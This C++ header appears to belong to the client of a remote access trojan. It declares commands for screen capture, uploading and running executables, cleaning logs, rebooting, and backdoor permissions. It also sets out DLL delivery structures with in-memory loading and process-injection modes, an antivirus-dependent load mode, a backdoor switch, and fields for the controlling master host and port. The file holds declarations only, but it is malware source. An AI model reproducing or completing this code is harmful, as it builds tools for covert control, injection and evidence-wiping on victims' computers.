#pragma once
#include "stdafx.h"
#include <vector> 
using namespace std;
#include "Manager.h"
#include "help.h"
#include <atlimage.h> //BMP2JPEG
class CLoginManager;


enum  LoginManager
{
	COMMAND_DLLMAIN,
	COMMAND_SENDLL,
	COMMAND_CLOSESOCKET,
	COMMAND_GET_PROCESSANDCONDITION,
	COMMAND_GET_SCREEN,
	COMMAND_UPLOAD_EXE,
	COMMAND_DOWN_EXE,
	COMMAND_RENAME,
	COMMAND_FILTERPROCESS,
	COMMAND_MONITOR,
	COMMAND_GETMONITOR,
	COMMAND_CLEANLOG,
	COMMAND_RESTART,
	COMMAND_EXIT,
	COMMAND_LOGOUT,
	COMMAND_REBOOT,
	COMMAND_SHUTDOWN,
	COMMAND_CHANGELOAD,
	COMMAND_CHANGEINFO,
	COMMAND_ADDCLIENT,
	COMMAND_SET_DOOR_GETPERMINSSION = 100,
	COMMAND_SET_DOOR_QUITPERMINSSION,
};


struct COPYCLIENT
{
	byte token;
	TCHAR confimodel[1000];
};


enum SENDTASK
{
	TASK_MAIN,					//普通插件方式 带1个普通导出函数名 不带参数
	TASK_PLUG,					//扩展插件加载标志
};

enum DLL_MODEL					//加载模式
{
	DLL_MEMLOAD, 				//普通内存加载 使用导出函数
	DLL_PUPPET,					//进程注入模式
	//DLL_SHELLCODE				//shellcode模式
};

struct DllSendDate
{
	SENDTASK sendtask;
	TCHAR DllName[255];			 //DL名称
	BOOL is_64;					//位数
	int DateSize;				//DLL大小
	TCHAR szVersion[50];		//版本
	TCHAR szcommand[1000];
	int i;
};

struct DllDate
{
	CLoginManager* m_CLoginManager;
	TCHAR* m_strMasterHost;
	UINT	m_nMasterPort;
	BOOL IsTcp;
	DllSendDate* m_sendate;
	byte* delldate;
	DLL_MODEL m_bhaveAV;
};



typedef struct
{
	BYTE			Btoken;			//协议
	TCHAR			UserActive[15];	//状态
	TCHAR			Window[250];	//当前窗口
	int				iScreenWidth;
	int				iScreenHeight;
	bool			bsomes[20];
}DATAUPDATE;


class CLoginManager : public CManager
{
public:

	CLoginManager(ISocketBase* pClient, TCHAR* lpszMasterHost, UINT nMasterPort, BOOL m_IsTcp,  BOOL IsBackDoor = FALSE);
	virtual ~CLoginManager();
	CLoginManager(ISocketBase* pClient);
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void FilterProcess(TCHAR* filtername);
	void SendCondition(bool all);
	byte* GetScreen(int& size, int& x, int& y, bool blitter, bool setsize, int setw, int seth);
	unsigned long BMP2JPEG(const char* pUnZipData, unsigned long ulUnZipDataLen, std::string* jpgData);
	BOOL IsActived();
	BOOL LocalLoad(LPBYTE lpBuffer, UINT nSize);
	bool RunFile(TCHAR* lpFile, INT nShowCmd);
	int  ReadRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, TCHAR* szData, LPBYTE szBytes, DWORD lbSize, int Mode);
	void ReName(TCHAR* lpGBuffer, TCHAR* lpBuffer);
	static unsigned __stdcall Loop_DownManager(LPVOID lparam);
	void restart();
	void EnumRegeditData(TCHAR* lpszSubKey);


	TCHAR	m_strMasterHost[MAX_PATH * 2];
	UINT	m_nMasterPort;
	BOOL m_IsBackDoor;		 //后门开关
	BOOL IsTcp;
	BOOL	m_bIsActived;
	DLL_MODEL m_bhaveAV;


};


typedef struct
{
	BYTE bToken;
	UINT nType;
	TCHAR lpCmdLine[MAX_PATH];
	TCHAR lpFileName[100];
}LOCALUP;

